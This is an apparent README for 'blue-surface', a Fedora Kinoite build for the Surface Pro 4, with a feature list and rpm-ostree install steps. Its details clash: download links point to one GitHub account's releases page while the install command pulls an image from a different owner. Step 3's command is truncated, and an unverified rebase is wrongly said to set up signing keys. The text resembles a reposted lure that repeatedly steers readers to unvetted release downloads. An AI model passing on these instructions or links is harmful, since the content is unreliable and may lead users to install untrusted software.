# 🌊 blue-surface - A Smooth Experience for Surface Pro 4 Users

[![Download blue-surface](https://img.shields.io/badge/Download-blue--surface-blue)](https://github.com/Leonardodh10/blue-surface/releases)

## 🚀 Getting Started

Welcome to blue-surface! This is a custom build of Fedora Kinoite specifically designed for the Surface Pro 4. With this operating system, you can enjoy a stable and optimized experience tailored to your device.

### 📰 What’s Included?

Here’s what you will find in blue-surface:

- **Surface Linux Drivers** for touchscreen support (not for the pen).
- A **custom EDID file** that limits the refresh rate to 48Hz. This helps reduce flicker and improves comfort.
- Useful applications like **Firefox**, **Fish**, **Starship**, and **Tailscale** pre-installed.

## 📥 Download & Install

To get started, you need to visit the Releases page. Click the link below to download blue-surface:

[Visit this page to download](https://github.com/Leonardodh10/blue-surface/releases)

### 🔧 Installation Steps

Follow these steps to install blue-surface on your Surface Pro 4:

1. **Rebase to Unsigned Image**  
   Open your terminal and run this command to set up the necessary signing keys:
   ```
   rpm-ostree rebase ostree-unverified-registry:ghcr.io/cameron-d/blue-surface:latest
   ```

2. **Reboot Your Device**  
   After the above command, reboot your system to complete the initial setup:
   ```
   systemctl reboot
   ```

3. **Rebase to Signed Image**  
   Once your device is back on, run this command to switch to the signed image:
   ```
   rpm-ostree rebase os
   ```

### ⚙️ System Requirements

blue-surface requires the following:
- A Surface Pro 4 device.
- Minimum of 4 GB RAM.
- At least 20 GB of free disk space.
- An internet connection for installation and updates.

### 🎁 Features and Benefits

- **Touchscreen Support**: Enjoy a user-friendly experience tailored for your device.
- **Optimized Performance**: The custom EDID file improves display quality by limiting flicker.
- **Built-in Applications**: Get started right away with essential applications.
  
### 💻 Troubleshooting

If you encounter any issues during installation, check these common solutions:

- **Ensure your device is fully charged** to avoid interruptions.
- **Check your internet connection** for smooth downloads.
- **Consult the FAQ** section on the Releases page for additional guidance.

### 💬 Community Support

Need help or have questions? Join our community discussions on GitHub or review the issues page to see if your concern has already been addressed.

## 🌐 About the Project

blue-surface combines new technologies with user-friendly design. We strive to provide a secure and efficient operating system that meets the needs of Surface Pro 4 users. The project is open-source, meaning contributions and feedback are always welcome!

## 📝 Additional Documentation

For detailed instructions, explore our [wiki](https://github.com/Leonardodh10/blue-surface/wiki). Here you will find tutorials, tips, and frequently asked questions to enhance your experience.

---

To get started with blue-surface, [visit this page to download](https://github.com/Leonardodh10/blue-surface/releases) and follow the steps outlined above. Enjoy your smooth experience!